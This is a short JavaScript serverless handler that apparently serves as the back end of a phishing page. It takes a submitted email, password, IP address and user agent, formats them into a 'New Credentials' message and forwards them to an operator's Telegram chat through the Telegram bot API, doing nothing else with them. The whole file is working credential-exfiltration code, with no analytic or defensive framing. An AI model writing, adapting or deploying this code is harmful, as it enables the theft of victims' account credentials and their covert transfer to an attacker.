export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password, ip, userAgent } = req.body;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ error: 'Missing env vars' });
        }

        const message = `
🔐 New Credentials
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ip || 'N/A'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
        `;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram responded with ${response.status}`);
        }

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Internal error' });
    }
} 
